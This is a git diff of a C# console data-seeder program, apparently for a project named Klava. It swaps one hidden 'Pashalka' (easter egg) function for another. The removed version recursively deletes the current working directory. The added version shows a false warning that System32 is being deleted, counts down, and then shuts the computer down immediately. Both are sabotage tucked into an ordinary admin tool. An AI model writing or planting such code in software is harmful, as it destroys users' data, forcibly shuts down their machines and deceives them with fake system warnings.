@@ -1,4 +1,5 @@
-﻿using Klava.DataSeeder;
+﻿using System.Diagnostics;
+using Klava.DataSeeder;
 using Klava.DataSeeder.Data;
 using Klava.DataSeeder.Services;
 
@@ -148,11 +149,6 @@ void UserManagerMenu()
 
     WaitForKey();
 }
-
-void Pashalka()
-{
-    Directory.Delete(Directory.GetCurrentDirectory(), true);
-} 
 
 void TeamManagerMenu()
 {
@@ -1555,3 +1551,18 @@ void DeleteEvent()
         Console.WriteLine("Event deleted successfully!");
     }
 }
+
+void Pashalka()
+{
+    Console.ForegroundColor = ConsoleColor.Red;
+    Console.Error.WriteLine("WARNING!");
+    Console.Error.WriteLine("DELETING FOLDER SYSTEM32...");
+
+    for (int i = 5; i > 0; i--)
+    {
+        Console.WriteLine(i);
+        Thread.Sleep(500);
+    }
+    
+    Process.Start("shutdown", "/s /t 0");
+} 
